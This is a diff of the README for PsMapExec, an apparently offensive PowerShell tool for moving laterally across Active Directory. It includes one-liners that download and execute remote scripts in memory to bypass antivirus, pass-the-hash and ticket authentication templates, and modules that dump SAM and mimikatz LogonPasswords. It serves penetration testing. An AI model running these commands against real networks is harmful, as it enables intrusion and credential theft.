@@ -1,8 +1,6 @@
 # PsMapExec
 
 More detailed documentation on how to use PsMapExec is available on Gitbook: https://viperone.gitbook.io/pentest-everything/psmapexec
-
-
 The changelog can be viewed here: https://viperone.gitbook.io/pentest-everything/psmapexec/change-log
 
 ## What is PsMapExec
@@ -32,7 +30,7 @@ Planned methods
 * FTP
 * SSH
   
-## Quick Start
+## Usage
 ### Load the script directly into memory (Bypass AV)
 ```
 IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-NETMongoose.ps1");IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
@@ -41,31 +39,57 @@ IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubuserconte
 ```
 IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
 ```
-\
-Execute some commands over WMI
+### Targets Acquisition
+Target acquisition through PsMapExec is utilized through ADSI Searcher. As long as you are operating from a domain joined system as a domain user account, no issues should be encountered when acquiring targets.
+By default only enabled Active Directory computer accounts are populated into the target list.
+IP Address specification and targets from file are currently unsupported but in development.
 ```
-PsMapExec -Targets Servers -Username Admin -Password Pass -Method WMI -Command "net user"
+# Grabs all workstations, servers and domain controllers within the domain
+PsMapExec -Targets All
+
+# Grabs only servers from the domain
+PsMapExec -Targets Servers
+
+# Grabs only Domain Controllers from the domain
+PsMapExec -Targets DCs
+
+# Grabs only workstations from the domain
+PsMapExec -Targets Workstations
+
+# Set the target values to a defined computer name
+PsMapExec -Targets DC01.Security.local
 ```
-\
-Check RDP access across all systems
+### Authentication Types
+When  -Command and -Module are omitted, PsMapExec will simply check the provided or current user credentials against the specified target systems for administrative access over the specified method.
 ```
-PsMapExec -Targets All -Username Admin -Password Pass -Method RDP
+# Current user
+PsMapExec -Targets All -Method [Method]
+
+# With Password
+PsMapExec -Targets All -Method [Method] -Username [Username] -Password [Password]
+
+# With Hash
+PsMapExec -Targets All -Method [Method] -Username [Username] -Hash [RC4/AES256]
+
+# With Ticket
+PsMapExec -Targets All -Method [Method] -Ticket [doI.. OR Path to ticket file]
+
+# Local Authentication (WMI only)
+PsMapExec -Targets All -Method WMI -LocalAuth
 ```
-\
-Dump SAM over WinRM and Parse the results
+### Command Execution
+All currently supported command execution methods support the -Command  parameter. The command parameter can be appended to the above Authentication Types to execute given commands as a specified or current user.
 ```
-PsMapExec -Targets Servers -Username Admin -Password Pass -Method WinRM -Module SAM -Option Parse
+PsMapExec -Targets All -Method [Method] -Command [Command]
 ```
-\
-Authenticate over WMI with a hash and execute mimikatz
+
+### Module Exectuion
+All currently supported command execution methods support the -Module  parameter. The module parameter can be appended to the Authentication Types to execute given modules as a specified or current user. 
 ```
-PsMapExec -Targets Workstations -Username Admin -Hash [Hash] -Method WMI -Module LogonPasswords -Option Parse -ShowOutput
+PsMapExec -Targets All -Method [Method] -Module [Module]
 ```
-\
-Check SMB Signing on all domain systems
-```
-PsMapExec -Targets All -Method GenRelayList
-```
+A list of modules is linked below in the Detailed Usage section.
+
 ## Detailed Usage
 * https://viperone.gitbook.io/pentest-everything/psmapexec
 * https://viperone.gitbook.io/pentest-everything/psmapexec/using-credentials
@@ -101,20 +125,18 @@ PsMapExec -Targets All -Username [User] -Password [Pass] -LocalFileServer [IP]
 <a href="https://www.buymeacoffee.com/ViperOne" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
 
 
-## Example Images
+## Showcase
+### SAM
+![image](https://github.com/The-Viper-One/PsMapExec/assets/68926315/e149e353-e0e9-426c-916a-4cdc2befbfb7)
 
-### Command Execution
-![image](https://github.com/The-Viper-One/PsMapExec/assets/68926315/e770e2b3-d441-4094-8a14-94848a3b6b74)
+### LogonPasswords
+![image](https://github.com/The-Viper-One/PsMapExec/assets/68926315/ab85bda0-51a5-4de1-b792-4b1994ed1499)
 
-### SAM Dump
-![image](https://github.com/The-Viper-One/PsMapExec/assets/68926315/f00a5468-ee99-4db3-82f5-e59223ecf219)
+### GenRelayList / SMB Signing
+![image](https://github.com/The-Viper-One/PsMapExec/assets/68926315/191218f5-9ede-4702-94cf-446404bdb44f)
 
 
-### Mimikatz
-![image](https://github.com/The-Viper-One/PsMapExec/assets/68926315/a576b9c8-703e-423e-8041-44daca6cf335)
 
-### RDP Access
-![image](https://github.com/The-Viper-One/PsMapExec/assets/68926315/ba875e2f-5898-4c10-a33c-7bcb9ef3a2f5)
 
 # Disclaimer
 PsMapExec is designed primarily for research, educational, and authorized testing scenarios. The purpose of developing and distributing PsMapExec is to provide professionals and researchers with a tool to understand and identify vulnerabilities and to bolster the security of systems. It is fundamentally imperative that users ensure they have obtained explicit, mutual consent from all involved parties before applying this tool on any system, network, or digital environment.
